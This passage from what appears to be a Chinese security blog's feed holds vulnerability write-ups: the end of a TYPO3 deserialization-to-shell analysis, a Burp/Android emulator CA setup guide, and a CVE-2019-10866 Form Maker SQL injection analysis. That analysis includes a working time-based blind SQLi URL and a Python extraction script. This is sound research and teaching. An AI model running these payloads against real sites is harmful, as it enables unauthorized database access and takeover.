(is_array(<span class="hljs-variable">$cmd</span>)) &#123;<br>        reset(<span class="hljs-variable">$cmd</span>);<br>        <span class="hljs-keyword">$this</span>-&gt;cmdmap = <span class="hljs-variable">$cmd</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而且<code>if ($this-&gt;doSave === true)</code>这个条件也是成立的，进入<code>process_datamap</code>方法。</p><p><img src="https://image.mengsec.com/typo3/15.png" alt="image-20190730155246564"></p><p>代码有注释还是容易阅读的，在第<code>985</code>行，获取了<code>datamap</code>中所有的键名，然后存储在<code>$orderOfTables</code>，然后进入<code>foreach</code>循环，而这个<code>$table</code>，在后面传入<code>fillInFieldArray</code>方法中，因此，我们只需要分析<code>$table == pages</code>时的循环即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$fieldArray</span> = <span class="hljs-keyword">$this</span>-&gt;fillInFieldArray(<span class="hljs-variable">$table</span>, <span class="hljs-variable">$id</span>, <span class="hljs-variable">$fieldArray</span>, <span class="hljs-variable">$incomingFieldArray</span>, <span class="hljs-variable">$theRealPid</span>, <span class="hljs-variable">$status</span>, <span class="hljs-variable">$tscPID</span>);<br></code></pre></td></tr></table></figure><p>大致浏览下代码，再结合前面的分析，我们需要满足以下条件：</p><ul><li><code>$recordAccess</code>的值要为<code>true</code></li><li><code>$incomingFieldArray</code>中的<code>payload</code>不会被删除</li><li><code>$table</code>的值为<code>pages</code></li><li><code>$id</code>中存在<code>NEW</code>字符串</li></ul><p>既然正常请求可以直接断在调用<code>fillInFieldArray</code>处，正常请求中，第一条、第三条和第四条都是成立的。</p><p>根据前面对<code>fillInFieldArray</code>方法的分析，构造<code>payload</code>，向提交的表单中添加三个键值对。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">data</span>[pages][NEW<span class="hljs-number">5</span>d<span class="hljs-number">3</span>fa<span class="hljs-number">40</span>cb<span class="hljs-number">5</span>ac<span class="hljs-number">4065255421</span>][l<span class="hljs-number">10</span>n_diffsource] ==&gt; serialized_shell_data<br><span class="hljs-attribute">data</span>[pages][NEW<span class="hljs-number">5</span>d<span class="hljs-number">3</span>fa<span class="hljs-number">40</span>cb<span class="hljs-number">5</span>ac<span class="hljs-number">4065255421</span>][sys_language_uid] ==&gt; <span class="hljs-number">4</span><br><span class="hljs-attribute">data</span>[pages][NEW<span class="hljs-number">5</span>d<span class="hljs-number">3</span>fa<span class="hljs-number">40</span>cb<span class="hljs-number">5</span>ac<span class="hljs-number">4065255421</span>][l<span class="hljs-number">10</span>n_parent] ==&gt; <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>其中<code>NEW*</code>字符串要根据表单生成的值进行对应的修改。</p><p><img src="https://image.mengsec.com/typo3/16.png" alt="image-20190730164830353"></p><p>发送请求后，依旧能够进入<code>fillInFieldArray</code>，而在传入的<code>$incomingFieldArray</code>参数中，可以看到我们添加的三个键值对。</p><p><img src="https://image.mengsec.com/typo3/17.png" alt="image-20190730164754935"></p><p>进入<code>fillInFieldArray</code>之后，其中<code>l10n_diffsource</code>将会进行反序列化操作。此时我们在请求中将其<code>l10n_diffsource</code>改为构造好的序列化字符串，重新发送请求即可成功<code>getshell</code>。</p><p><img src="https://image.mengsec.com/typo3/18.png" alt="image-20190730165403364"></p><h2 id="5-写在最后"><a href="#5-写在最后" class="headerlink" title="5. 写在最后"></a>5. 写在最后</h2><p>其实单看这个漏洞的利用条件，还是有点鸡肋的，需要你获取到<code>typo3</code>的一个有效的后台账户，并且拥有编辑<code>page</code>的权限。</p><p>而且这次分析<code>Typo3</code>给我的感觉与其他网站完全不同，我在分析创建&amp;修改<code>page</code>这个功能的参数过程中，并没有发现什么过滤操作，在后台的所有参数都是根据<code>TCA</code>的定义来进行相应的操作，只有传入不符合<code>TCA</code>定义的才会抛出异常。而<code>TCA</code>的验证又不严格导致了变量覆盖这个问题。</p><p>官方的修补方式也是不太懂，直接禁止了反序列化操作，但是个人认为这次漏洞的重点还是在于前面变量覆盖的问题上，尤其是<code>Backend</code>的利用过程中，可以直接覆盖从数据库中取出的数据，这样只能算是治标不治本，后面还是有可能产生新的问题。</p><p>当然了，以上只是个人拙见，如有错误，还请诸位斧正。</p><h2 id="6-参考链接"><a href="#6-参考链接" class="headerlink" title="6. 参考链接"></a>6. 参考链接</h2><ul><li><a href="https://blog.ripstech.com/2019/typo3-overriding-the-database/">https://blog.ripstech.com/2019/typo3-overriding-the-database/</a></li><li><a href="https://www.php.net/manual/en/function.unserialize.php">https://www.php.net/manual/en/function.unserialize.php</a></li><li><a href="https://docs.typo3.org/m/typo3/reference-tca/master/en-us/Introduction/Index.html">https://docs.typo3.org/m/typo3/reference-tca/master/en-us/Introduction/Index.html</a></li><li><a href="https://typo3.org/security/advisory/typo3-core-sa-2019-020/">https://typo3.org/security/advisory/typo3-core-sa-2019-020/</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>漏洞分析</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>踩坑记录——使用Burp抓取网易MuMu的数据包</title>
    <link href="/2019/08/04/use-burp-grab-netease-mumu-packets/"/>
    <url>/2019/08/04/use-burp-grab-netease-mumu-packets/</url>
    
    <content type="html"><![CDATA[<p>最近有分析APP数据包的需求，在配置环境过程中踩了几个坑，在此记录一下。</p><a id="more"></a><h2 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h2><h3 id="1-1-安装网易MuMu"><a href="#1-1-安装网易MuMu" class="headerlink" title="1.1 安装网易MuMu"></a>1.1 安装网易MuMu</h3><p>默认配置安装即可。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//mumu</span>.<span class="hljs-number">163</span>.com/<br></code></pre></td></tr></table></figure><h3 id="1-2-安装ADB"><a href="#1-2-安装ADB" class="headerlink" title="1.2 安装ADB"></a>1.2 安装ADB</h3><p>ADB其实就是安卓调试桥，在后面我们导入证书要用到。安装也很简单，一条命令就好了。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">brew </span>cask <span class="hljs-keyword">install </span><span class="hljs-keyword">android-platform-tools</span><br></code></pre></td></tr></table></figure><h2 id="2-代理配置"><a href="#2-代理配置" class="headerlink" title="2. 代理配置"></a>2. 代理配置</h2><h3 id="2-1-配置Burp代理"><a href="#2-1-配置Burp代理" class="headerlink" title="2.1 配置Burp代理"></a>2.1 配置Burp代理</h3><p>配置Burp抓取所有网卡，此处我们将监听端口设置在<code>23333</code>。</p><p><img src="https://image.mengsec.com/toss/20190804130319.png"></p><h3 id="2-2-配置模拟器的代理"><a href="#2-2-配置模拟器的代理" class="headerlink" title="2.2 配置模拟器的代理"></a>2.2 配置模拟器的代理</h3><p>在设置-WLAN中长按，进入配置界面。</p><p><img src="https://image.mengsec.com/toss/20190804130538.png"></p><p>如图所示进行配置，其中代理服务器主机名就是本机IP，默认为<code>10.0.3.2</code>，代理服务器端口就是我们在前面设置Burp的监听端口。第三个一定要配置，否则会导致整个模拟器不可用，比如无法进行输入、标签页卡死、卡99%等。</p><blockquote><p><a href="https://coder.lufer.cc/2019/07/21/%E7%BD%91%E6%98%93Mumu%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE/">https://coder.lufer.cc/2019/07/21/%E7%BD%91%E6%98%93Mumu%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE/</a></p></blockquote><h2 id="3-导入根证书"><a href="#3-导入根证书" class="headerlink" title="3. 导入根证书"></a>3. 导入根证书</h2><p>首先下载根证书，直接在浏览器访问Burp监听端口即可看到下载链接，点击即可。</p><p><img src="https://image.mengsec.com/toss/20190804131314.png"></p><p>将Burp证书用openssl将DER转换为PEM，然后输出subject_hash_old值并重命名该文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">openssl x509 -inform DER -in cacert.der -out cacert.pem<br>openssl x509 -inform PEM -subject_hash_old -in cacert.pem|head -1<br>cp cacert.pem 9a5ba575.0<br></code></pre></td></tr></table></figure><p>使用ADB连接安卓模拟器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo adb kill-server<br>sudo adb server<br></code></pre></td></tr></table></figure><p>将生成好的证书传入系统文件夹下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">adb</span> root<br><span class="hljs-attribute">adb</span> remount<br><span class="hljs-attribute">adb</span> push <span class="hljs-number">9</span>a<span class="hljs-number">5</span>ba<span class="hljs-number">575</span>.<span class="hljs-number">0</span> /sdcard/<br></code></pre></td></tr></table></figure><p>然后进入<code>shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb shell<br><span class="hljs-meta">#</span><span class="bash">在shell中</span><br>mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/9a5ba575.0<br>chmod 644 /system/etc/security/cacerts/9a5ba575.0<br></code></pre></td></tr></table></figure><p>最后重启模拟器，在设置-安全-信任的凭据可以找到已导入的根证书。</p><p><img src="https://image.mengsec.com/toss/20190804132129.png"></p><p>到此，整个环境就配置完了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>折腾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Form Maker 1.13.3 SQL注入分析（CVE-2019-10866）</title>
    <link href="/2019/07/15/Form-Maker-1-13-3-SQL-Injection/"/>
    <url>/2019/07/15/Form-Maker-1-13-3-SQL-Injection/</url>
    
    <content type="html"><![CDATA[<p>对<code>WordPress</code>插件<code>Form Maker 1.13.3</code>SQL注入漏洞(CVE-2019-10866)的分析。<br>本文首发<a href="https://xz.aliyun.com/t/5637">先知社区</a></p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在复习<code>SQL注入</code>的一些知识，对于<code>order by</code>后面的注入遇到的不是很多，正好五月底<code>WordPress</code>的一个表单生成器插件出了一个<code>SQL注入</code>漏洞，恰好是<code>order by</code>的问题，于是拿来分析一波。如有错误，还望师傅们批评指正。</p><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><p>运行环境很简单，只是在<code>vulapps</code>的基础环境的上加了<code>xdebug</code>调试插件，把<code>docker</code>容器作为远程服务器来进行调试。<br><code>Dockerfile</code>文件:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">FROM</span> medicean/vulapps:base_lamp_php7<br><br>RUN pecl install xdebug<br><br><span class="hljs-keyword">COPY</span> php.ini <span class="hljs-regexp">/etc/</span>php<span class="hljs-regexp">/7.0/</span>apache2/<br><span class="hljs-keyword">COPY</span> php.ini <span class="hljs-regexp">/etc/</span>php<span class="hljs-regexp">/7.0/</span>cli/<br></code></pre></td></tr></table></figure><p><code>docker-compose</code>文件:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-symbol">services:</span><br>  lamp-php7:<br><span class="hljs-symbol">    build:</span> .<br><span class="hljs-symbol">    ports:</span><br>      - <span class="hljs-string">&quot;80:80&quot;</span><br><span class="hljs-symbol">    volumes:</span><br>      - <span class="hljs-string">&quot;/Users/mengchen/Security/Code Audit/html:/var/www/html&quot;</span><br>      - <span class="hljs-string">&quot;/Users/mengchen/Security/Code Audit/tmp:/tmp&quot;</span><br></code></pre></td></tr></table></figure><p><code>php.ini</code>中<code>xdebug</code>的配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[xdebug]</span><br><span class="hljs-attr">zend_extension</span>=<span class="hljs-string">&quot;/usr/lib/php/20151012/xdebug.so&quot;</span><br><span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.remote_host</span>=<span class="hljs-number">10.254</span>.<span class="hljs-number">254.254</span><br><span class="hljs-attr">xdebug.remote_port</span>=<span class="hljs-number">9000</span><br><span class="hljs-attr">xdebug.remote_connect_back</span>=<span class="hljs-number">0</span><br><span class="hljs-attr">xdebug.profiler_enable</span>=<span class="hljs-number">0</span><br><span class="hljs-attr">xdebug.idekey</span>=PHPSTORM<br><span class="hljs-attr">xdebug.remote_log</span>=<span class="hljs-string">&quot;/tmp/xdebug.log&quot;</span><br></code></pre></td></tr></table></figure><p>因为我是在<code>Mac</code>上，所以要给本机加一个<code>IP</code>地址，让<code>xdebug</code>能够连接。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> ifconfig lo<span class="hljs-number">0</span> alias <span class="hljs-number">10.254.254.254</span><br></code></pre></td></tr></table></figure><p><code>PHPStorm</code>也要配置好相对路径:</p><p><img src="https://image.mengsec.com/cve/20190710002400.png"></p><p>插件下载地址:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>downloads.wordpress.org<span class="hljs-regexp">/plugin/</span>form-maker.<span class="hljs-number">1.13</span>.<span class="hljs-number">3</span>.zip<br></code></pre></td></tr></table></figure><p><code>WordPress</code>使用最新版就可以，在这里我使用的版本是<code>5.2.2</code>，语言选的简体中文。</p><p>PS: <code>WordPress</code>搭建完毕后，记得关闭自动更新。</p><h2 id="2-POC"><a href="#2-POC" class="headerlink" title="2. POC"></a>2. POC</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/wp-<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">admin</span>.php?page=submissions_fm&amp;task=display&amp;current_id=<span class="hljs-number">2</span>&amp;order_by=group_id&amp;asc_or_desc=,(<span class="hljs-keyword">case</span>+<span class="hljs-keyword">when</span>+(<span class="hljs-keyword">select</span>+ascii(substring(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))%<span class="hljs-number">3</span>d114+<span class="hljs-keyword">then</span>+(<span class="hljs-keyword">select</span>+sleep(<span class="hljs-number">5</span>)+<span class="hljs-keyword">from</span>+wp_users+<span class="hljs-keyword">limit</span>+<span class="hljs-number">1</span>)+<span class="hljs-keyword">else</span>+<span class="hljs-number">2</span>+<span class="hljs-keyword">end</span>)+<span class="hljs-keyword">asc</span>%<span class="hljs-number">3</span>b<br></code></pre></td></tr></table></figure><p><code>Python</code>脚本，修改自<a href="https://www.exploit-db.com/exploits/46958">exploit-db</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>vul_url = <span class="hljs-string">&quot;http://127.0.0.1/wp-admin/admin.php?page=submissions_fm&amp;task=display&amp;current_id=2&amp;order_by=group_id&amp;asc_or_desc=&quot;</span><br>S = requests.Session()<br>S.headers.update(&#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,en;q=0.8,zh;q=0.5,en-US;q=0.3&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1/wp-login.php?loggedout=true&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;)<br>length = <span class="hljs-number">0</span><br>TIME = <span class="hljs-number">3</span><br>username = <span class="hljs-string">&quot;admin&quot;</span><br>password = <span class="hljs-string">&quot;admin&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>(<span class="hljs-params">username, password</span>):</span><br>    data = &#123;<br>        <span class="hljs-string">&quot;log&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <br>        <span class="hljs-string">&quot;pwd&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <br>        <span class="hljs-string">&quot;wp-submit&quot;</span>: <span class="hljs-string">&quot;\xe7\x99\xbb\xe5\xbd\x95&quot;</span>, <br>        <span class="hljs-string">&quot;redirect_to&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1/wp-admin/&quot;</span>, <br>        <span class="hljs-string">&quot;testcookie&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>        &#125;<br>    r = S.post(<span class="hljs-string">&#x27;http://127.0.0.1/wp-login.php&#x27;</span>, data=data, cookies = &#123;<span class="hljs-string">&quot;wordpress_test_cookie&quot;</span>: <span class="hljs-string">&quot;WP+Cookie+check&quot;</span>&#125;)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">attack</span>():</span><br>    flag = <span class="hljs-literal">True</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> flag:<br>        flag = <span class="hljs-literal">False</span><br>        tmp_ascii = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> <span class="hljs-built_in">ascii</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>            tmp_ascii = <span class="hljs-built_in">ascii</span><br>            start_time = time.time()<br>            payload = <span class="hljs-string">&quot;&#123;vul_url&#125;,(case+when+(select+ascii(substring(user(),&#123;length&#125;,1)))%3d&#123;ascii&#125;+then+(select+sleep(&#123;TIME&#125;)+from+wp_users+limit+1)+else+2+end)+asc%3b&quot;</span>.<span class="hljs-built_in">format</span>(vul_url=vul_url, <span class="hljs-built_in">ascii</span>=<span class="hljs-built_in">ascii</span>, TIME=TIME, length=length)<br>            <span class="hljs-comment">#print(payload)</span><br>            r = S.get(payload)<br>            tmp = time.time() - start_time<br>            <span class="hljs-keyword">if</span> tmp &gt;= TIME:<br>                flag = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag:<br>            data += <span class="hljs-built_in">chr</span>(tmp_ascii)<br>            length += <span class="hljs-number">1</span><br>        print(data)<br>login(username, password)<br>attack()<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/cve/20190710105902.png"></p><h2 id="3-漏洞分析"><a href="#3-漏洞分析" class="headerlink" title="3. 漏洞分析"></a>3. 漏洞分析</h2><h3 id="3-1-漏洞利用流程分析"><a href="#3-1-漏洞利用流程分析" class="headerlink" title="3.1 漏洞利用流程分析"></a>3.1 漏洞利用流程分析</h3><p>根据<code>POC</code>，我们很容易知道，注入点在参数<code>asc_or_desc</code>上，根据它的命名，极有可能是<code>order by</code>之后的注入。<br>首先大致浏览下插件目录下的文件结构:</p><p><img src="https://image.mengsec.com/cve/20190709202328.png"></p><p>很经典的<code>MVC</code>架构，但是有点无从下手，还是从<code>POC</code>出发吧，</p><p>首先全局搜索字符串<code>asc_or_desc</code>，根据传入的参数<code>page=submissions_fm&amp;task=display</code>，以及我们搜索到的结果，可以猜测，<code>submissions_fm</code>就是指代的调用的插件文件，<code>display</code>就是要调用的方法。</p><p><img src="https://image.mengsec.com/cve/20190709205412.png"></p><p>在这里下一个断点验证一下。</p><p>根据函数调用栈，我们很容易就能知道，在<code>form-maker.php:502, WDFM-&gt;form_maker()</code>处，代码将<code>FMControllerSubmissions_fm</code>进行了实例化，然后调用了它的<code>execute()</code>方法。</p><p><img src="https://image.mengsec.com/cve/20190709211032.png"></p><p>接下来就进入了<code>Submissions_fm.php:93, FMControllerSubmissions_fm-&gt;execute()</code></p><p><img src="https://image.mengsec.com/cve/20190709211939.png"></p><p>获取传入的<code>task</code>和<code>current_id</code>，动态调用<code>FMControllerSubmissions_fm</code>类的方法<code>display</code>，并将<code>current_id</code>的值作为参数传入。</p><p>后面依次进入了<code>model</code>类<code>FMModelSubmissions_fm</code>中的<code>get_forms()</code>，<code>get_statistics();</code>和<code>blocked_ips()</code>方法，分别跟进之后并没有发现调用<code>asc_or_desc</code>参数。</p><p>继续往下，进入类<code>FMModelSubmissions_fm</code>中<code>get_labels_parameters</code>方法。<br>路径:<code>wp-content/plugins/form-maker/admin/models/Submissions_fm.php:93</code></p><p><img src="https://image.mengsec.com/cve/20190710115624.png"></p><p>到了第<code>133</code>行:</p><p><img src="https://image.mengsec.com/cve/20190709214536.png"></p><p>代码从这里获取了传入的<code>asc_or_desc</code>的值，并将其存入了<code>$asc_or_desc</code>变量中。</p><p>跟进一下，看一看代码对其进行了怎样的处理。</p><p>路径:<code>wp-content/plugins/form-maker/framework/WDW_FM_Library.php:367</code></p><p><img src="https://image.mengsec.com/cve/20190709215849.png"></p><p>根据传入的键值<code>asc_or_desc</code>，动态调用<code>$_GET[$key]</code>，把值存入<code>$value</code>中，然后传入了静态私有方法<code>validate_data()</code>中</p><p>继续跟进，在第<code>395</code>行</p><p><img src="https://image.mengsec.com/cve/20190709220330.png"></p><p>使用<code>stripslashes()</code>函数去除了<code>value</code>中的反斜杠，又因为<code>$esc_html</code>为<code>true</code>，进入了<code>esc_html</code></p><p>在<a href="https://developer.wordpress.org/reference/functions/esc_html/">WordPress手册</a>中，可以查到它的作用是将传入的值转义为<code>HTML</code>块。</p><p>跟进一下，我们可以看到代码调用了两个<code>WordPress</code>的内置方法对传入的<code>value</code>值进行了处理<br>路径<code>wp-includes/formatting.php:4348</code></p><p><img src="https://image.mengsec.com/cve/20190709221724.png"></p><p>从<code>WordPress</code>手册中，能查到<code>_wp_specialchars</code>是对<code>&amp;</code>、<code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code>和<code>&#39;</code>进行了<code>HTML</code>实体编码。</p><p><img src="https://image.mengsec.com/cve/20190709220810.png"></p><p>可以知道，在获取<code>asc_or_desc</code>参数的过程中，只过滤了<code>\</code>、<code>&amp;</code>、<code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code>和<code>&#39;</code>。</p><p>然后回到<code>get_labels_parameters</code>接着往下看。</p><p>在第<code>161</code>行，因为传入的<code>$order_by == group_id</code>满足条件，成功将<code>$asc_or_desc</code>，拼接到了变量<code>$orderby</code>中。</p><p><img src="https://image.mengsec.com/cve/20190709233336.png"></p><p>后面虽然有一些查询操作，但是都没有拼接<code>$orderby</code>，也没有对其做进一步的过滤处理。<br>导致在第<code>311</code>行，<code>Payload</code>拼接进入了<code>SQL</code>语句，然后在<code>312</code>行进行了数据库查询操作。</p><p><img src="https://image.mengsec.com/cve/20190709234313.png"></p><p>看一下数据库的日志也能看到，执行了<code>SQL</code>语句:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">distinct</span> group_id <span class="hljs-keyword">FROM</span> wp_formmaker_submits <span class="hljs-keyword">WHERE</span>  form_id<span class="hljs-operator">=</span><span class="hljs-number">2</span>  <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> group_id ,(<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (<span class="hljs-keyword">select</span> ascii(<span class="hljs-built_in">substring</span>(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">114</span> <span class="hljs-keyword">then</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">from</span> wp_users limit <span class="hljs-number">1</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">2</span> <span class="hljs-keyword">end</span>) <span class="hljs-keyword">asc</span>;<br></code></pre></td></tr></table></figure><p>在<code>mysql</code>中执行一下，由于<code>when</code>后面的条件成立，语句中的<code>sleep(5)</code>生效了。</p><p><img src="https://image.mengsec.com/cve/20190709235501.png"></p><p>到这里，整个<code>POC</code>的执行流程我们就看完了。</p><h3 id="3-2-漏洞原理分析"><a href="#3-2-漏洞原理分析" class="headerlink" title="3.2 漏洞原理分析"></a>3.2 漏洞原理分析</h3><p>简单总结一下，我们传入参数<code>?page=submissions_fm&amp;task=display</code>，让代码走到了存在漏洞的方法<code>get_labels_parameters</code>中。</p><p><img src="https://image.mengsec.com/cve/20190710204505.png"></p><p>而方法<code>get_labels_parameters</code>中，在获取参数<code>asc_or_desc</code>的值的过程中，基本没有进行过滤，就将其拼接进入了<code>SQL</code>语句中，并执行，导致了<code>SQL</code>注入。</p><p><img src="https://image.mengsec.com/cve/20190710212706.png"></p><h2 id="4-补丁分析"><a href="#4-补丁分析" class="headerlink" title="4. 补丁分析"></a>4. 补丁分析</h2><p>我们将1.13.3版本的插件卸载掉，安装一下<a href="https://downloads.wordpress.org/plugin/form-maker.1.13.4.zip">1.13.4</a>版本，查看一下是如何修复的。</p><p>路径:<code>wp-content/plugins/form-maker/admin/models/Submissions_fm.php:133</code></p><p><img src="https://image.mengsec.com/cve/20190710214826.png"></p><p>简单粗暴，限制了<code>asc_or_desc</code>的值只能为<code>desc</code>和<code>asc</code>其中的一个。</p><h2 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5. 参考链接"></a>5. 参考链接</h2><ul><li><a href="https://www.exploit-db.com/exploits/46958">https://www.exploit-db.com/exploits/46958</a></li><li><a href="https://developer.wordpress.org/">https://developer.wordpress.org/</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>SQL注入</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP黑魔法深度剖析（一）——PHP的弱类型比较</title>
    <link href="/2019/06/20/php-trick-weak-type/"/>
    <url>/2019/06/20/php-trick-weak-type/</url>
    
